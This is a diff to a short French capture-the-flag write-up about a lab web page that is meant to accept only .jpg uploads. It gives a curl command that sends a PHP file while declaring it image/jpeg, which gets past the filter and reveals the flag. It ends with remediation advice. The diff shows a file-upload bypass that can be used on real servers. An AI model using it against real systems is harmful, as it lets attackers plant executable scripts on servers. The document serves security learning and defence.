@@ -1,6 +1,9 @@
-Sur la page upload, on ne peut pas mettre autre chose depuis le site que des .jpg. Mais avec la commende curl cela est possible: 
+Sur la page upload.
+On ne peut pas mettre autre chose depuis le site que des .jpg. Mais avec la commande curl cela est possible. On va donc faire passer un script php pour une image: 
 curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@script.php;type=image/jpeg' http://10.1.1.5/index.php\?page\=upload\# > index.html
 
 le fichier script.php ne contient rien. C'est juste pour montrer qu'on peut mettre un script PHP alors que l'on n'est pas autohrise normalement.
 
 On trouve le flag dans la page index.html qui contient le retour de la requete curl.
+
+Il faut verifier les extensions du fichier, verifier le contenu du fichier, ajouter un header qui empechera l'execution de celui-ci.
